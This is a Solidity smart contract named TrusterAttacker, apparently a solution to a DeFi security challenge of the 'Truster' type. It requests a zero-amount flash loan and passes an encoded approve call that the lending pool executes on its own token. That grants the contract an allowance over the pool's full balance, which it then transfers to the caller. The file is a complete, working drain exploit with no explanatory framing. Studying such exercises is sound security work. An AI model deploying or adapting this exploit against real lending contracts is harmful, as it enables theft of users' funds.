// SPDX-License-Identif

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "hardhat/console.sol";

interface TrustedLenderPool {
    function flashLoan(
        uint256 borrowAmount,
        address borrower,
        address target,
        bytes calldata data
    ) external;
}

contract TrusterAttacker {
    using Address for address;

    address target;
    uint256 constant BORROW_AMOUNT = 0;
    address targetERC20;
    TrustedLenderPool targetContract;

    constructor(address _target, address _targetERC20) {
        target = _target;
        targetERC20 = _targetERC20;
        targetContract = TrustedLenderPool(_target);
    }

    function getApproval() public {
        uint256 balance = IERC20(targetERC20).balanceOf(target);
        bytes memory payload = abi.encodeWithSignature(
            "approve(address,uint256)",
            address(this),
            balance
        );

        // console.log("FROM CONTRACT ::: Balance: ", balance);
        // console.log("FROM CONTRACT ::: Payload: ", string(payload));
        targetContract.flashLoan(
            BORROW_AMOUNT,
            address(this),
            targetERC20,
            payload
        );

        IERC20(targetERC20).transferFrom(target, msg.sender, balance);
    }
}
